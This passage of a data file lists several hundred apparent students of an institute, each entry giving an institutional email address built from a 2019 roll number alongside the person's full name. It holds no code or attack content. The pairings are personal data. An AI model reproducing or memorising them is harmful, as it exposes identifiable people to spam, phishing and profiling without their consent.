        {mail: '2019UME1173@mnit.ac.in',
        name: 'VINIT TAPARIA'},
        
        
        {mail: '2019UME1637@mnit.ac.in',
        name: 'VIJESH JATOLIYA'},
        
        
        {mail: '2019UME1688@mnit.ac.in',
        name: 'SHIVANSH GARG'},
        
        
        {mail: '2019UME1712@mnit.ac.in',
        name: 'SUTHAPALLI SANDEEP'},
        
        
        {mail: '2019UMT1074@mnit.ac.in',
        name: 'SHEELA MEROTHA'},
        
        
        {mail: '2019UMT1470@mnit.ac.in',
        name: 'SATYAM JAIN'},
        
        
        {mail: '2019UMT1845@mnit.ac.in',
        name: 'ASHUTOSH TIWARI'},
        
        
        {mail: '2019UCE1102@mnit.ac.in',
        name: 'AKANKSHA LAHARI'},
        
        
        {mail: '2019UCE1176@mnit.ac.in',
        name: 'SATYAM KUMAR'},
        
        
        {mail: '2019UCE1609@mnit.ac.in',
        name: 'SUDARSHAN YADAV'},
        
        
        {mail: '2019UCP1033@mnit.ac.in',
        name: 'BHAKTI JADAVJIBHAI    HIRANI'},
        
        
        {mail: '2019UCP1281@mnit.ac.in',
        name: 'TANUSHA SARASWAT'},
        
        
        {mail: '2019UCP1314@mnit.ac.in',
        name: 'SATYAM SONKER'},
        
        
        {mail: '2019UCP1374@mnit.ac.in',
        name: 'ROBIN SHARMA'},
        
        
        {mail: '2019UCP1550@mnit.ac.in',
        name: 'KUSHAL ERRAMILLI'},
        
        
        {mail: '2019UEC1015@mnit.ac.in',
        name: 'MUDIT MAHAWAR'},
        
        
        {mail: '2019UEC1654@mnit.ac.in',
        name: 'YAKSHRAJ SHARMA'},
        
        
        {mail: '2019UEC1655@mnit.ac.in',
        name: 'MOHIT GUPTA'},
        
        
        {mail: '2019UME1115@mnit.ac.in',
        name: 'ADITYA ATUL GUPTA'},
        
        
        {mail: '2019UME1215@mnit.ac.in',
        name: 'ANANYA MUKHERJEE'},
        
        
        {mail: '2019UME1227@mnit.ac.in',
        name: 'JIGYASA MAWAR'},
        
        
        {mail: '2019UME1398@mnit.ac.in',
        name: 'ASHVIN MUJALDE'},
        
        
        {mail: '2019UME1716@mnit.ac.in',
        name: 'NAMIT JAIN'},
        
        
        {mail: '2019UME1830@mnit.ac.in',
        name: 'KRATI VERMA'},
        
        
        {mail: '2019UMT1346@mnit.ac.in',
        name: 'ADARSH RANA'},
        
        
        {mail: '2019UMT1495@mnit.ac.in',
        name: 'SACHIN KUMAWAT'},
        
        
        {mail: '2019UMT1758@mnit.ac.in',
        name: 'LOKESH YADAV'},
        
        
        {mail: '2019UCE1134@mnit.ac.in',
        name: 'KUSHAGRA AGRAWAL'},
        
        
        {mail: '2019UCE1204@mnit.ac.in',
        name: 'GARIMA KOTWANI'},
        
        
        {mail: '2019UCE1782@mnit.ac.in',
        name: 'GAURAV KUMAR'},
        
        
        {mail: '2019UCH1443@mnit.ac.in',
        name: 'HARSH RAJPUT'},
        
        
        {mail: '2019UCH1573@mnit.ac.in',
        name: 'PRAKASH'},
        
        
        {mail: '2019UCP1055@mnit.ac.in',
        name: 'VIVEK JAIN'},
        
        
        {mail: '2019UCP1306@mnit.ac.in',
        name: 'SHIVAM MEHTA'},
        
        
        {mail: '2019UCP1341@mnit.ac.in',
        name: 'PARAKRAM SINGH    SHEKHAWAT'},
        
        
        {mail: '2019UCP1732@mnit.ac.in',
        name: 'SHUBHAM RAI'},
        
        
        {mail: '2019UEC1065@mnit.ac.in',
        name: 'ANUJ JANGID'},
        
        
        {mail: '2019UEC1713@mnit.ac.in',
        name: 'RUSHIL MAKKAR'},
        
        
        {mail: '2019UEC1735@mnit.ac.in',
        name: 'DILIP KUMAR MEENA'},
        
        
        {mail: '2019UEE1295@mnit.ac.in',
        name: 'VAIBHAW SHRESTH'},
        
        
        {mail: '2019UEE1381@mnit.ac.in',
        name: 'ADARSH MISHRA'},
        
        
        {mail: '2019UEE1592@mnit.ac.in',
        name: 'MUKESH KUMAR'},
        
        
        {mail: '2019UEE1624@mnit.ac.in',
        name: 'RISHABH'},
        
        
        {mail: '2019UME1246@mnit.ac.in',
        name: 'MOHIT KHEMCHANDANI'},
        
        
        {mail: '2019UMT1530@mnit.ac.in',
        name: 'UTSAVI DANGI'},
        
        
        {mail: '2019UMT1652@mnit.ac.in',
        name: 'AKSSHAT SANGHI'},
        
        
        {mail: '2019UMT1669@mnit.ac.in',
        name: 'VIPUL'},
        
        
        {mail: '2019UCE1125@mnit.ac.in',
        name: 'GAURAV PRATAP SINGH'},
        
        
        {mail: '2019UCE1159@mnit.ac.in',
        name: 'AMIT KUMAR YADAV'},
        
        
        {mail: '2019UCE1165@mnit.ac.in',
        name: 'SANKALP CHAHAR'},
        
        
        {mail: '2019UCE1481@mnit.ac.in',
        name: 'SHAILESH'},
        
        
        {mail: '2019UCH1302@mnit.ac.in',
        name: 'NITISH DEVARSHI'},
        
        
        {mail: '2019UCH1444@mnit.ac.in',
        name: 'MOHAMMAD AAMIR'},
        
        
        {mail: '2019UCH1492@mnit.ac.in',
        name: 'JAY SHIKHA GODARA'},
        
        
        {mail: '2019UCH1593@mnit.ac.in',
        name: 'YOGESH KUMAR'},
        
        
        {mail: '2019UCH1666@mnit.ac.in',
        name: 'SONI SHRUSHTI SANJEEV'},
        
        
        {mail: '2019UCH1832@mnit.ac.in',
        name: 'HARDIK KALRA'},
        
        
        {mail: '2019UCP1365@mnit.ac.in',
        name: 'TANUJ'},
        
        
        {mail: '2019UCP1391@mnit.ac.in',
        name: 'SHREYANSH JANAGAL'},
        
        
        {mail: '2019UCP1631@mnit.ac.in',
        name: 'NISHA YADAV'},
        
        
        {mail: '2019UEC1009@mnit.ac.in',
        name: 'PABBATHI DHANUNJAY'},
        
        
        {mail: '2019UEC1068@mnit.ac.in',
        name: 'RONAK SINGH'},
        
        
        {mail: '2019UEC1529@mnit.ac.in',
        name: 'SUMIT PATEL'},
        
        
        {mail: '2019UEC1659@mnit.ac.in',
        name: 'VIVEK KUMAR'},
        
        
        {mail: '2019UME1108@mnit.ac.in',
        name: 'GOVIND RAM PATIDAR'},
        
        
        {mail: '2019UMT1804@mnit.ac.in',
        name: 'SHALINI MAURYA'},
        
        
        {mail: '2019UMT1821@mnit.ac.in',
        name: 'NAMAN DADHICH'},
        
        
        {mail: '2019UCE1138@mnit.ac.in',
        name: 'ABHIJEET ANAND'},
        
        
        {mail: '2019UCE1171@mnit.ac.in',
        name: 'MAHESH JAT'},
        
        
        {mail: '2019UCE1455@mnit.ac.in',
        name: 'ABHISHEK KUMAR'},
        
        
        {mail: '2019UCE1526@mnit.ac.in',
        name: 'DHARAMSOTH SHARATH'},
        
        
        {mail: '2019UCE1596@mnit.ac.in',
        name: 'RAKESH MOOND'},
        
        
        {mail: '2019UCE1711@mnit.ac.in',
        name: 'ANISH SRIVASTAVA'},
        
        
        {mail: '2019UCE1766@mnit.ac.in',
        name: 'VAISHALI RAWAT'},
        
        
        {mail: '2019UCH1466@mnit.ac.in',
        name: 'RAJNEESH'},
        
        
        {mail: '2019UCH1759@mnit.ac.in',
        name: 'ATUL GARG'},
        
        
        {mail: '2019UCP1053@mnit.ac.in',
        name: 'HEMANT CHAUDHARY'},
        
        
        {mail: '2019UEC1026@mnit.ac.in',
        name: 'AARSH KUMAR'},
        
        
        {mail: '2019UEC1062@mnit.ac.in',
        name: 'ROHIT KATARIA'},
        
        
        {mail: '2019UEC1113@mnit.ac.in',
        name: 'KAUSHAL CHAKARDHARI'},
        
        
        {mail: '2019UEC1603@mnit.ac.in',
        name: 'GIRISH KUMAR'},
        
        
        {mail: '2019UEC1757@mnit.ac.in',
        name: 'ADITYA SINGHAL'},
        
        
        {mail: '2019UEE1722@mnit.ac.in',
        name: 'ARYAMAN SINGH'},
        
        
        {mail: '2019UME1202@mnit.ac.in',
        name: 'SHREYASH SINGH'},
        
        
        {mail: '2019UME1232@mnit.ac.in',
        name: 'ANURAG SINGH PATEL'},
        
        
        {mail: '2019UMT1361@mnit.ac.in',
        name: 'PRATUL MEENA'},
        
        
        {mail: '2019UMT1474@mnit.ac.in',
        name: 'RISHABH JAIN'},
        
        
        {mail: '2019UCE1700@mnit.ac.in',
        name: 'VIKAS RAJPOOT'},
        
        
        {mail: '2019UCE1720@mnit.ac.in',
        name: 'ANUPAM SHARMA'},
        
        
        {mail: '2019UCH1457@mnit.ac.in',
        name: 'ANIRUDH SAXENA'},
        
        
        {mail: '2019UCP1329@mnit.ac.in',
        name: 'AKS UMESHKUMAR PATEL'},
        
        
        {mail: '2019UCP1334@mnit.ac.in',
        name: 'RAJKAMAL GOMLADU'},
        
        
        {mail: '2019UCP1343@mnit.ac.in',
        name: 'JANHAVI VIRENDRA    SATPUTE'},
        
        
        {mail: '2019UCP1350@mnit.ac.in',
        name: 'MANVIR SINGH'},
        
        
        {mail: '2019UCP1356@mnit.ac.in',
        name: 'RITESH RANJAN'},
        
        
        {mail: '2019UEC1011@mnit.ac.in',
        name: 'ARPAN JAIN'},
        
        
        {mail: '2019UEC1054@mnit.ac.in',
        name: 'AGRIMA GAUR'},
        
        
        {mail: '2019UEC1456@mnit.ac.in',
        name: 'ARCHITA KUMARI'},
        
        
        {mail: '2019UEE1287@mnit.ac.in',
        name: 'RAHUL CHOUDHARY'},
        
        
        {mail: '2019UEE1767@mnit.ac.in',
        name: 'SUHANI AGRAWAL'},
        
        
        {mail: '2019UME1085@mnit.ac.in',
        name: 'GAGAN MALIYA'},
        
        
        {mail: '2019UME1177@mnit.ac.in',
        name: 'NIKITA YADAV'},
        
        
        {mail: '2019UME1240@mnit.ac.in',
        name: 'ABHINANDAN TAILOR'},
        
        
        {mail: '2019UME1628@mnit.ac.in',
        name: 'SWEETI KUMARI'},
        
        
        {mail: '2019UME1641@mnit.ac.in',
        name: 'VIKASH KUMAR'},
        
        
        {mail: '2019UMT1799@mnit.ac.in',
        name: 'DIVYA PAREEK'},
        
        
        {mail: '2019UMT1863@mnit.ac.in',
        name: 'AJAY SINGH'},
        
        
        {mail: '2019UCE1155@mnit.ac.in',
        name: 'KUMARI AANCHAL'},
        
        
        {mail: '2019UCH1547@mnit.ac.in',
        name: 'BODA MAHENDAR'},
        
        
        {mail: '2019UCH1653@mnit.ac.in',
        name: 'LAKSHYA KANUNGO'},
        
        
        {mail: '2019UCH1871@mnit.ac.in',
        name: 'MOHIT KUMAR AGARWAL'},
        
        
        {mail: '2019UCP1013@mnit.ac.in',
        name: 'ABHISHEK RATHORE'},
        
        
        {mail: '2019UCP1415@mnit.ac.in',
        name: 'RISHI CHITARA'},
        
        
        {mail: '2019UCP1433@mnit.ac.in',
        name: 'NIKHIL KUMAR SINGH'},
        
        
        {mail: '2019UCP1638@mnit.ac.in',
        name: 'AMAN CHOUDHARY'},
        
        
        {mail: '2019UEC1001@mnit.ac.in',
        name: 'ABHISHEK SINGH'},
        
        
        {mail: '2019UEC1050@mnit.ac.in',
        name: 'NIRANJAN BAIRWA'},
        
        
        {mail: '2019UEC1183@mnit.ac.in',
        name: 'AMRITA KUMARI'},
        
        
        {mail: '2019UEC1607@mnit.ac.in',
        name: 'ANSHUL'},
        
        
        {mail: '2019UEC1648@mnit.ac.in',
        name: 'PAVANI ABHAY    DESHMUKH'},
        
        
        {mail: '2019UEE1321@mnit.ac.in',
        name: 'AMAAN ADIL KHAN'},
        
        
        {mail: '2019UME1217@mnit.ac.in',
        name: 'KRISHNA RATHORE'},
        
        
        {mail: '2019UME1611@mnit.ac.in',
        name: 'AKSHAT SHARMA'},
        
        
        {mail: '2019UMT1438@mnit.ac.in',
        name: 'RAHUL GOYAL'},
        
        
        {mail: '2019UMT1819@mnit.ac.in',
        name: 'NARSINGH'},
        
        
        {mail: '2019UMT1824@mnit.ac.in',
        name: 'KARRA MACHENDER'},
        
        
        {mail: '2019UMT1829@mnit.ac.in',
        name: 'SHIKHAR AWASTHI'},
        
        
        {mail: '2019UCE1133@mnit.ac.in',
        name: 'GAURAV AGARWAL'},
        
        
        {mail: '2019UCE1222@mnit.ac.in',
        name: 'SHIVAM AGARWAL'},
        
        
        {mail: '2019UCE1435@mnit.ac.in',
        name: 'MANKAR SHIVAM'},
        
        
        {mail: '2019UCE1703@mnit.ac.in',
        name: 'ABHIJEET GUPTA'},
        
        
        {mail: '2019UCH1540@mnit.ac.in',
        name: 'ANISH SINGH'},
        
        
        {mail: '2019UCH1571@mnit.ac.in',
        name: 'AKSHAY KUMAR DAYMA'},
        
        
        {mail: '2019UCP1403@mnit.ac.in',
        name: 'SHOBHIT YADAV'},
        
        
        {mail: '2019UCP1430@mnit.ac.in',
        name: 'AAYUSH AGARWAL'},
        
        
        {mail: '2019UEC1014@mnit.ac.in',
        name: 'CHARU BANSAL'},
        
        
        {mail: '2019UEC1082@mnit.ac.in',
        name: 'ARUNIM HARSH'},
        
        
        {mail: '2019UEC1368@mnit.ac.in',
        name: 'KUSHAGRA RANA'},
        
        
        {mail: '2019UEC1453@mnit.ac.in',
        name: 'KADAVATH SURESH'},
        
        
        {mail: '2019UEC1751@mnit.ac.in',
        name: 'ASHISH TAYAL'},
        
        
        {mail: '2019UME1201@mnit.ac.in',
        name: 'PRAVEEN CHOUDHARY'},
        
        
        {mail: '2019UME1230@mnit.ac.in',
        name: 'CHAILSE GUPTA'},
        
        
        {mail: '2019UME1291@mnit.ac.in',
        name: 'AMBUJ SINGH'},
        
        
        {mail: '2019UMT1778@mnit.ac.in',
        name: 'VIKAS SHARMA'},
        
        
        {mail: '2019UMT1781@mnit.ac.in',
        name: 'MOHIT JOSHI'},
        
        
        {mail: '2019UMT1846@mnit.ac.in',
        name: 'ROHIT SHARMA'},
        
        
        {mail: '2019UMT1872@mnit.ac.in',
        name: 'RAHUL MEENA'},
        
        
        {mail: '2019UCE1103@mnit.ac.in',
        name: 'PHAIREMBAM BOND'},
        
        
        {mail: '2019UCE1118@mnit.ac.in',
        name: 'AMAN'},
        
        
        {mail: '2019UCE1161@mnit.ac.in',
        name: 'NARENDRA KUMAR'},
        
        
        {mail: '2019UCE1175@mnit.ac.in',
        name: 'SIDHANTO SUJOY MUKERJI'},
        
        
        {mail: '2019UCH1665@mnit.ac.in',
        name: 'NIKHIL CHAUDHARY'},
        
        
        {mail: '2019UCP1363@mnit.ac.in',
        name: 'ANKIT JAT'},
        
        
        {mail: '2019UCP1372@mnit.ac.in',
        name: 'AYUSH UPADHYAY'},
        
        
        {mail: '2019UCP1383@mnit.ac.in',
        name: 'UMASHANKAR YADAV'},
        
        
        {mail: '2019UCP1386@mnit.ac.in',
        name: 'ABHILASHA AGARWAL'},
        
        
        {mail: '2019UCP1424@mnit.ac.in',
        name: 'LEKH RAJ MEENA'},
        
        
        {mail: '2019UCP1643@mnit.ac.in',
        name: 'KHUSHI SAGAR'},
        
        
        {mail: '2019UEC1012@mnit.ac.in',
        name: 'RAVI GUPTA'},
        
        
        {mail: '2019UEC1750@mnit.ac.in',
        name: 'SOURAV VISHNOI'},
        
        
        {mail: '2019UEC1776@mnit.ac.in',
        name: 'PARSHVA JAIN'},
        
        
        {mail: '2019UEE1330@mnit.ac.in',
        name: 'AADITYA BITHU'},
        
        
        {mail: '2019UEE1870@mnit.ac.in',
        name: 'ARYAN DWIVEDI'},
        
        
        {mail: '2019UME1121@mnit.ac.in',
        name: 'SUTHAR VIJAY DALLARAM'},
        
        
        {mail: '2019UME1212@mnit.ac.in',
        name: 'AKSHITA NAGAR'},
        
        
        {mail: '2019UMT1777@mnit.ac.in',
        name: 'JAHANVI RAJORA'},
        
        
        {mail: '2019UCE1615@mnit.ac.in',
        name: 'RINKU SAINI'},
        
        
        {mail: '2019UCH1359@mnit.ac.in',
        name: 'ASHISH KUMAR'},
        
        
        {mail: '2019UCH1554@mnit.ac.in',
        name: 'KHOOB CHANDRA RAJPUT'},
        
        
        {mail: '2019UCH1590@mnit.ac.in',
        name: 'SACHIN AGARWAL'},
        
        
        {mail: '2019UCP1299@mnit.ac.in',
        name: 'HIMANSHI SINGH'},
        
        
        {mail: '2019UCP1401@mnit.ac.in',
        name: 'SAGAR GOYAL'},
        
        
        {mail: '2019UCP1425@mnit.ac.in',
        name: 'SHASHWAT GANDHI'},
        
        
        {mail: '2019UEC1029@mnit.ac.in',
        name: 'RAM PRASAD BIDIYASAR'},
        
        
        {mail: '2019UEC1523@mnit.ac.in',
        name: 'MANCHALA ANJALI'},
        
        
        {mail: '2019UEE1310@mnit.ac.in',
        name: 'ABHAY TRIVEDI'},
        
        
        {mail: '2019UEE1737@mnit.ac.in',
        name: 'FAAIZ AHMED'},
        
        
        {mail: '2019UME1160@mnit.ac.in',
        name: 'SAGAR UPADHYAY'},
        
        
        {mail: '2019UME1223@mnit.ac.in',
        name: 'YASH KUNDARA'},
        
        
        {mail: '2019UME1243@mnit.ac.in',
        name: 'KASHISH'},
        
        
        {mail: '2019UME1561@mnit.ac.in',
        name: 'VAKEEL'},
        
        
        {mail: '2019UME1725@mnit.ac.in',
        name: 'KASRALIKAR ARJUN'},
        
        
        {mail: '2019UMT1315@mnit.ac.in',
        name: 'SUNIL KUMAR GODWAL'},
        
        
        {mail: '2019UMT1701@mnit.ac.in',
        name: 'GIRDHARI GAT'},
        
        
        {mail: '2019UMT1709@mnit.ac.in',
        name: 'MONIKA KUMARI'},
        
        
        {mail: '2019UMT1836@mnit.ac.in',
        name: 'JARAPLA SAI RAM'},
        
        
        {mail: '2019UCE1807@mnit.ac.in',
        name: 'PRASHANT SHIVHARE'},
        
        
        {mail: '2019UCH1538@mnit.ac.in',
        name: 'DHEERAJ UPADHYAY'},
        
        
        {mail: '2019UCH1541@mnit.ac.in',
        name: 'ANKIT JESADIA'},
        
        
        {mail: '2019UCH1787@mnit.ac.in',
        name: 'SURAJ KUMAR'},
        
        
        {mail: '2019UCP1326@mnit.ac.in',
        name: 'CHHOTE LAL KUMAR'},
        
        
        {mail: '2019UCP1364@mnit.ac.in',
        name: 'ATUL YADAV'},
        
        
        {mail: '2019UEC1010@mnit.ac.in',
        name: 'PRIYANSHU KANSAL'},
        
        
        {mail: '2019UEC1327@mnit.ac.in',
        name: 'SHLOK DHARMESH MANGE'},
        
        
        {mail: '2019UEC1447@mnit.ac.in',
        name: 'VIKAS TELI'},
        
        
        {mail: '2019UEC1598@mnit.ac.in',
        name: 'SUDHANSHU KUMAR'},
        
        
        {mail: '2019UEC1755@mnit.ac.in',
        name: 'PRABHJIT SINGH'},
        
        
        {mail: '2019UEC1839@mnit.ac.in',
        name: 'ANANYA RAJ'},
        
        
        {mail: '2019UEE1273@mnit.ac.in',
        name: 'RAJPAL DARA'},
        
        
        {mail: '2019UME1101@mnit.ac.in',
        name: 'ANURAG BANSAL'},
        
        
        {mail: '2019UME1158@mnit.ac.in',
        name: 'RIDDHI SHARMA'},
        
        
        {mail: '2019UME1191@mnit.ac.in',
        name: 'DEVANSHU GUPTA'},
        
        
        {mail: '2019UME1213@mnit.ac.in',
        name: 'SAURAV KUMAR MEENA'},
        
        
        {mail: '2019UME1366@mnit.ac.in',
        name: 'PRIYANSHU KARKHUR'},
        
        
        {mail: '2019UME1436@mnit.ac.in',
        name: 'SYED ADNAN ALI'},
        
        
        {mail: '2019UME1678@mnit.ac.in',
        name: 'AISHA MALIK'},
        
        
        {mail: '2019UCE1142@mnit.ac.in',
        name: 'ANKIT SATOLIYA'},
        
        
        {mail: '2019UCE1179@mnit.ac.in',
        name: 'SACHIN MASIWAL'},
        
        
        {mail: '2019UCE1773@mnit.ac.in',
        name: 'MAHIMA'},
        
        
        {mail: '2019UCH1568@mnit.ac.in',
        name: 'CHIRAG AHUJA'},
        
        
        {mail: '2019UCP1347@mnit.ac.in',
        name: 'SURENDRA KUMAR'},
        
        
        {mail: '2019UCP1351@mnit.ac.in',
        name: 'YUVRAJ SINGH TANWAR'},
        
        
        {mail: '2019UCP1370@mnit.ac.in',
        name: 'DIVYA RATHORE'},
        
        
        {mail: '2019UCP1393@mnit.ac.in',
        name: 'RAHUL RANJAN'},
        
        
        {mail: '2019UCP1409@mnit.ac.in',
        name: 'MANISH KUMAR'},
        
        
        {mail: '2019UEC1627@mnit.ac.in',
        name: 'SUMIT PRAJAPAT'},
        
        
        {mail: '2019UEE1399@mnit.ac.in',
        name: 'GANPAT SINGH'},
        
        
        {mail: '2019UEE1412@mnit.ac.in',
        name: 'AJMEERA.DINISHA'},
        
        
        {mail: '2019UEE1684@mnit.ac.in',
        name: 'SHASHANK RATHORE'},
        
        
        {mail: '2019UEE1779@mnit.ac.in',
        name: 'ROHITASH SAMOTA'},
        
        
        {mail: '2019UEE1825@mnit.ac.in',
        name: 'VIKAS KUMAR'},
        
        
        {mail: '2019UME1094@mnit.ac.in',
        name: 'TRISHA GOYAL'},
        
        
        {mail: '2019UME1107@mnit.ac.in',
        name: 'NILESH PATIDAR'},
        
        
        {mail: '2019UMT1225@mnit.ac.in',
        name: 'HRITHIK SALAMPURIA'},
        
        
        {mail: '2019UMT1427@mnit.ac.in',
        name: 'HEMANT GULUPALLI'},
        
        
        {mail: '2019UMT1728@mnit.ac.in',
        name: 'HARSH RAJPOOT'},
        
        
        {mail: '2019UCE1105@mnit.ac.in',
        name: 'AYUSH KUMAR GARG'},
        
        
        {mail: '2019UCE1157@mnit.ac.in',
        name: 'AJAY GOYAL'},
        
        
        {mail: '2019UCE1762@mnit.ac.in',
        name: 'SARVESH KUMAR'},
        
        
        {mail: '2019UCE1833@mnit.ac.in',
        name: 'SHUBHAM SAINI'},
        
        
        {mail: '2019UCH1234@mnit.ac.in',
        name: 'IRA TAK'},
        
        
        {mail: '2019UCH1569@mnit.ac.in',
        name: 'MANISH KUMAR'},
        
        
        {mail: '2019UEC1018@mnit.ac.in',
        name: 'AMAN PAREEK'},
        
        
        {mail: '2019UEC1090@mnit.ac.in',
        name: 'VINAY DANGAYACH'},
        
        
        {mail: '2019UEC1349@mnit.ac.in',
        name: 'JASPREET SINGH'},
        
        
        {mail: '2019UEC1448@mnit.ac.in',
        name: 'HITESH KUMAR KANWAR'},
        
        
        {mail: '2019UEE1229@mnit.ac.in',
        name: 'KARAN JANGU'},
        
        
        {mail: '2019UEE1292@mnit.ac.in',
        name: 'ANJALI MOTIRAMANI'},
        
        
        {mail: '2019UEE1301@mnit.ac.in',
        name: 'PRATEEK SINGH'},
        
        
        {mail: '2019UEE1305@mnit.ac.in',
        name: 'TUSHAR NANNAWARE'},
        
        
        {mail: '2019UME1190@mnit.ac.in',
        name: 'ANURAG SHUKLA'},
        
        
        {mail: '2019UME1629@mnit.ac.in',
        name: 'JATIN KUMAR'},
        
        
        {mail: '2019UME1723@mnit.ac.in',
        name: 'SHRUTI KUMARI'},
        
        
        {mail: '2019UMT1241@mnit.ac.in',
        name: 'MANISH KUMAR SINGH'},
        
        
        {mail: '2019UMT1820@mnit.ac.in',
        name: 'PRANAV PAREEK'},
        
        
        {mail: '2019UMT1834@mnit.ac.in',
        name: 'NISHANT KUMAR SINGH'},
        
        
        {mail: '2019UCE1092@mnit.ac.in',
        name: 'AYUSH SINGH'},
        
        
        {mail: '2019UCE1153@mnit.ac.in',
        name: 'DHANANJAY PRATAP'},
        
        
        {mail: '2019UCE1513@mnit.ac.in',
        name: 'YASH JAIN'},
        
        
        {mail: '2019UCE1802@mnit.ac.in',
        name: 'AYUSH DHOUNDIYAL'},
        
        
        {mail: '2019UCH1501@mnit.ac.in',
        name: 'SWADHA KUMARI'},
        
        
        {mail: '2019UCH1519@mnit.ac.in',
        name: 'SHREEANSH'},
        
        
        {mail: '2019UCP1224@mnit.ac.in',
        name: 'VADLA KOUSHIK'},
        
        
        {mail: '2019UCP1259@mnit.ac.in',
        name: 'MOHITPAL SINGH'},
        
        
        {mail: '2019UCP1367@mnit.ac.in',
        name: 'ABHAY SHIVHARE'},
        
        
        {mail: '2019UEC1007@mnit.ac.in',
        name: 'SITESH JAIN'},
        
        
        {mail: '2019UEC1355@mnit.ac.in',
        name: 'PUNEET SINGH'},
        
        
        {mail: '2019UEC1431@mnit.ac.in',
        name: 'YASH CHANDRASHEKHAR    ADSULE'},
        
        
        {mail: '2019UEC1724@mnit.ac.in',
        name: 'AASTHA MISHRA'},
        
        
        {mail: '2019UEE1296@mnit.ac.in',
        name: 'NANDITA SINGH'},
        
        
        {mail: '2019UEE1674@mnit.ac.in',
        name: 'MADHURIM GUPTA'},
        
        
        {mail: '2019UEE1815@mnit.ac.in',
        name: 'VINAYAK SINGH'},
        
        
        {mail: '2019UME1228@mnit.ac.in',
        name: 'VIRENDER SINGH'},
        
        
        {mail: '2019UMT1122@mnit.ac.in',
        name: 'AJAY SUMAN'},
        
        
        {mail: '2019UMT1510@mnit.ac.in',
        name: 'KRISHAN KUMAWAT'},
        
        
        {mail: '2019UMT1753@mnit.ac.in',
        name: 'AMIT KUMAR PANDEY'},
        
        
        {mail: '2019UCE1097@mnit.ac.in',
        name: 'YASHWANT SINGH'},
        
        
        {mail: '2019UCE1622@mnit.ac.in',
        name: 'RITU RAJ'},
        
        
        {mail: '2019UCH1410@mnit.ac.in',
        name: 'MUDAVATH KITTU NAYAK'},
        
        
        {mail: '2019UCH1442@mnit.ac.in',
        name: 'SHARWAN SINGH'},
        
        
        {mail: '2019UCH1473@mnit.ac.in',
        name: 'NIKHIL CHHONKAR'},
        
        
        {mail: '2019UCH1548@mnit.ac.in',
        name: 'SATYAM JAISWAL'},
        
        
        {mail: '2019UCH1584@mnit.ac.in',
        name: 'DEEPAK KUMAR'},
        
        
        {mail: '2019UCH1798@mnit.ac.in',
        name: 'VAIBHAV GUPTA'},
        
        
        {mail: '2019UCP1298@mnit.ac.in',
        name: 'GITANJLI'},
        
        
        {mail: '2019UEC1022@mnit.ac.in',
        name: 'GREETA CHOUDHARY'},
        
        
        {mail: '2019UEC1035@mnit.ac.in',
        name: 'KANHAIYA SINGHAL'},
        
        
        {mail: '2019UEC1439@mnit.ac.in',
        name: 'DIPIKA MALIK'},
        
        
        {mail: '2019UEC1697@mnit.ac.in',
        name: 'VIBHANSHU GARG'},
        
        
        {mail: '2019UME1649@mnit.ac.in',
        name: 'JABIN THOMAS JOHN'},
        
        
        {mail: '2019UME1699@mnit.ac.in',
        name: 'UTKARSH RAWAT'},
        
        
        {mail: '2019UME1746@mnit.ac.in',
        name: 'DEVSHREE RAO'},
        
        
        {mail: '2019UMT1459@mnit.ac.in',
        name: 'ATUL PATEL'},
        
        
        {mail: '2019UMT1502@mnit.ac.in',
        name: 'HIMALAYA SONI'},
        
        
        {mail: '2019UMT1527@mnit.ac.in',
        name: 'RAJVEER MEENA'},
        
        
        {mail: '2019UMT1841@mnit.ac.in',
        name: 'AMAN SRIVASTAVA'},
        
        
        {mail: '2019UCE1135@mnit.ac.in',
        name: 'SANJANA DEV'},
        
        
        {mail: '2019UCH1407@mnit.ac.in',
        name: 'KANAK MEENA'},
        
        
        {mail: '2019UCH1487@mnit.ac.in',
        name: 'ANURAG ALORIYA'},
        
        
        {mail: '2019UCH1576@mnit.ac.in',
        name: 'BHAVYA SINGH'},
        
        
        {mail: '2019UCP1328@mnit.ac.in',
        name: 'SACHIN RAJ'},
        
        
        {mail: '2019UCP1339@mnit.ac.in',
        name: 'OM RAJANI'},
        
        
        {mail: '2019UCP1354@mnit.ac.in',
        name: 'ZEENAT BANO'},
        
        
        {mail: '2019UCP1384@mnit.ac.in',
        name: 'PRIYANKA TUDU'},
        
        
        {mail: '2019UCP1400@mnit.ac.in',
        name: 'SPARSH'},
        
        
        {mail: '2019UCP1402@mnit.ac.in',
        name: 'KARISHMA KUMARI'},
        
        
        {mail: '2019UCP1483@mnit.ac.in',
        name: 'DHRUV UDAYKUMAR    PRAJAPATI'},
        
        
        {mail: '2019UEC1041@mnit.ac.in',
        name: 'NOMAN DANISH    MOHAMMED'},
        
        
        {mail: '2019UEC1323@mnit.ac.in',
        name: 'AASHISH GANESH    RAVIDAS'},
        
        
        {mail: '2019UEE1263@mnit.ac.in',
        name: 'VIJAY AGARWAL'},
        
        
        {mail: '2019UEE1336@mnit.ac.in',
        name: 'DEVANSH RAJ LACHHEY'},
        
        
        {mail: '2019UEE1816@mnit.ac.in',
        name: 'JHARNA TIWARI'},
        
        
        {mail: '2019UME1783@mnit.ac.in',
        name: 'SHUBHAM MALHOTRA'},
        
        
        {mail: '2019UME1826@mnit.ac.in',
        name: 'SHANTANU BAJPAI'},
        
        
        {mail: '2019UMT1677@mnit.ac.in',
        name: 'SOURABH YADAV'},
        
        
        {mail: '2019UMT1744@mnit.ac.in',
        name: 'AADITYA KANJOLIA'},
        
        
        {mail: '2019UCE1577@mnit.ac.in',
        name: 'YOGESH CHOUDHARY'},
        
        
        {mail: '2019UCH1057@mnit.ac.in',
        name: 'PRIYANSHU MITTAL'},
        
        
        {mail: '2019UCH1462@mnit.ac.in',
        name: 'JAINENDRA SHARMA'},
        
        
        {mail: '2019UCP1239@mnit.ac.in',
        name: 'ATUL ANAND'},
        
        
        {mail: '2019UEC1006@mnit.ac.in',
        name: 'SUBHRANSHU SHEKHAR    BEHERA'},
        
        
        {mail: '2019UEC1396@mnit.ac.in',
        name: 'YOGESH KUMAR MOURYA'},
        
        
        {mail: '2019UEC1406@mnit.ac.in',
        name: 'GUBBALA SREE DEEPIKA'},
        
        
        {mail: '2019UEE1256@mnit.ac.in',
        name: 'RAKESH DHAKA'},
        
        
        {mail: '2019UEE1258@mnit.ac.in',
        name: 'KESHAV'},
        
        
        {mail: '2019UEE1338@mnit.ac.in',
        name: 'ROHIT SINGH'},
        
        
        {mail: '2019UEE1559@mnit.ac.in',
        name: 'RAM LAL JATAV'},
        
        
        {mail: '2019UEE1831@mnit.ac.in',
        name: 'AMAN MEHROTRA'},
        
        
        {mail: '2019UME1193@mnit.ac.in',
        name: 'ANSHUL SUNIL BANSOD'},
        
        
